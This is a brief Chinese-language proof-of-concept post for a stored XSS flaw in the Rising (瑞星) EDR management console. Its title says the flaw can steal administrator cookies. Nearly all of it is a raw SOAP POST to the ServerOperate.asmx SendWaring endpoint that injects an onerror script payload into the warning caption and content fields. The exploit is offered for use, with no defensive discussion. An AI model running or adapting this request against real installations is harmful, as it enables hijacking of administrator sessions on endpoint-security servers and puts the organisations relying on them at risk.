## 瑞星EDR-XSS漏洞可打管理员cookie



## poc

```
POST /ESM/WebService/ServerOperate.asmx HTTP/1.1
Host: 192.168.102.132
Content-Type: text/xml; charset=utf-8
Content-Length: 536
SOAPAction: "Rising.ESM.WebUI.WebService/SendWaring"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SendWaring xmlns="Rising.ESM.WebUI.WebService">
      <waring>{"logid":1,"type":1,"caption":"aaaaa<img src=2>a","content":"aa<img src=333331 onerror=alert(/xsshack/)>a","date":"2022-07-04 11:05","state":1,"desc":"xxxxxxx"}</waring>
    </SendWaring>
  </soap:Body>
</soap:Envelope>
```

